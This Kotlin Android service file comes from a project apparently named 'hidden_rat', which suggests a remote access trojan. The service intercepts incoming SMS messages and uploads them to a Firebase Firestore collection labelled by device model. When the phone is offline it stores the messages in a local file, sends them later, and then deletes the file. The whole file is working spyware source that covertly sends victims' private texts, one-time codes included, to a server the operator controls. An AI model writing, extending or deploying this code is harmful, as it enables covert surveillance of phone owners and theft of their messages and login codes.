package com.ratx.hidden_rat.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.IBinder
import android.util.Log
import com.ratx.hidden_rat.model.SMSData
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader

class SmsService : Service() {
    private lateinit var firestore: FirebaseFirestore

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handleIncomingSms(intent)
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        firestore = FirebaseFirestore.getInstance()
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    private fun handleIncomingSms(intent: Intent?) {
        if (intent?.action == "com.azamovhudstc.SMS_ACTION") {
            Log.d("EVENT", "handleIncomingSms: ")
            val smsData = intent.getSerializableExtra("smsData") as SMSData
            if (isOnline()) {
                if (isLocalSmsAvailable()) {
                    sendAllSmsDataToFirebase()
                    saveSmsDataToFirebase(smsData)
                } else {
                    saveSmsDataToFirebase(smsData)

                }
            } else {
                saveSmsToFile(smsData)
            }
        }
    }

    private fun isLocalSmsAvailable(): Boolean {
        val fileName = "sms_log.json"
        val filePath = File(getExternalFilesDir(null), fileName)
        return filePath.exists()
    }


    private fun saveSmsToFile(smsData: SMSData) {
        val gson = Gson()

        // Convert the list to JSON string
        val jsonString = gson.toJson(smsData)

        val fileName = "sms_log.json"
        val filePath = File(getExternalFilesDir(null), fileName)
        val outputStream = FileOutputStream(filePath, false) // Rewrite the file
        outputStream.write(jsonString.toByteArray())
        outputStream.close()
    }

    private fun isOnline(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    private fun sendAllSmsDataToFirebase() {
        val smsDataList = readSmsFromFile()
        val deviceModel = android.os.Build.MODEL
        val collectionReference = firestore.collection("sms_$deviceModel")
        for (smsData in smsDataList) {
            collectionReference.add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d("EVENT", "SMS data sent to Firebase successfully")
                    // Ma'lumot Firebase ga muvaffaqiyatli yuborilgan, shuning uchun lokal faylni o'chiramiz
                    deleteLocalSmsFile()
                }
                .addOnFailureListener { e ->
                    Log.e("EVENT", "Error sending SMS data to Firebase", e)
                }
        }
    }

    private fun saveSmsDataToFirebase(smsData: SMSData) {
        val deviceModel = android.os.Build.MODEL
        val collectionReference = firestore.collection("sms_$deviceModel")
        collectionReference.add(smsData)
            .addOnSuccessListener { documentReference ->
                Log.d("EVENT", "SMS data sent to Firebase successfully")
            }
            .addOnFailureListener { e ->
                Log.e("EVENT", "Error sending SMS data to Firebase", e)
            }
    }

    private fun deleteLocalSmsFile() {
        val fileName = "sms_log.json"
        val filePath = File(getExternalFilesDir(null), fileName)
        if (filePath.exists()) {
            filePath.delete()
            Log.d("EVENT", "Local SMS file deleted successfully")
        } else {
            Log.e("EVENT", "Local SMS file not found")
        }
    }


    private fun readSmsFromFile(): List<SMSData> {
        val gson = Gson()
        val fileName = "sms_log.json"
        val filePath = File(getExternalFilesDir(null), fileName)

        if (!filePath.exists()) {
            // If file doesn't exist, return an empty list
            return emptyList()
        }

        val fileReader = FileReader(filePath)
        val typeToken = object : TypeToken<List<SMSData>>() {}.type
        return gson.fromJson(fileReader, typeToken)
    }
}